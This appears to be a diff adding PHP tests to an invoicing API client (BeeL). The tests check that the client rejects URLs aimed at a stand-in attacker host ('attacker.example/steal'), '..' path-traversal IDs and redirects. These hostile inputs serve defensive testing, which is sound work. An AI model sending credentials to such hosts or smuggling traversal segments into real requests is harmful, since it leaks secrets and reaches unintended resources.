@@ -1964,3 +1964,40 @@ it('applies a default main tax to lines added with addLine(), unless a line pass
         ->and($lines[1]->getMainTax()->getPercentage())->toEqual(4)
         ->and(InvoiceBuilder::create()->forCustomer('c')->addLine('No tax', 1, 1)->build()->getLines()[0]->isInitialized('mainTax'))->toBeFalse();
 });
+
+it('never sends the API key to a host other than BeeL', function (Closure $call) {
+    $transport = new RecordingPsrClient([]);
+
+    expect(fn () => $call(testClient($transport)))->toThrow(InvalidArgumentException::class)
+        ->and($transport->requests)->toBe([]);
+})->with([
+    'absolute URL' => [fn (Beel $beel) => $beel->request('GET', 'https://attacker.example/steal')],
+    'scheme-relative URL' => [fn (Beel $beel) => $beel->request('GET', '//attacker.example/steal')],
+    'path without a leading slash' => [fn (Beel $beel) => $beel->request('GET', 'v1/me')],
+    'query in the path' => [fn (Beel $beel) => $beel->request('GET', '/v1/invoices?status=DRAFT')],
+]);
+
+it('rejects a path parameter that would change the resource a request reaches', function (Closure $call) {
+    $transport = new RecordingPsrClient([]);
+
+    expect(fn () => $call(testClient($transport)))->toThrow(InvalidArgumentException::class)
+        ->and($transport->requests)->toBe([]);
+})->with([
+    'parent segment' => [fn (Beel $beel) => $beel->company('company-1')->invoices->delete('..')],
+    'current segment' => [fn (Beel $beel) => $beel->company('company-1')->invoices->get('.')],
+    'empty ID' => [fn (Beel $beel) => $beel->company('company-1')->invoices->get('')],
+    'empty company' => [fn (Beel $beel) => $beel->company('')->invoices->list()],
+    'request() parameter' => [fn (Beel $beel) => $beel->request('DELETE', '/v1/companies/{company_id}/logo', ['company_id' => '..'])],
+    'empty request() parameter' => [fn (Beel $beel) => $beel->request('DELETE', '/v1/companies/{company_id}/logo', ['company_id' => ''])],
+]);
+
+it('treats a redirect as a failed request, never as a success', function (Closure $call) {
+    $transport = new RecordingPsrClient([new Response(301, ['Location' => 'https://app.beel.es/api/v1/x'])]);
+
+    expect(fn () => $call(testClient($transport)))->toThrow(BeelApiError::class);
+})->with([
+    'request() write' => [fn (Beel $beel) => $beel->request('POST', '/v1/companies/{company_id}/series/defaults', ['company_id' => 'c'], body: ['x' => 1])],
+    'delete' => [fn (Beel $beel) => $beel->company('c')->invoices->delete('i')],
+    'get' => [fn (Beel $beel) => $beel->company('c')->invoices->get('i')],
+    'file download' => [fn (Beel $beel) => $beel->company('c')->invoices->export(['invoice_ids' => ['i']])],
+]);
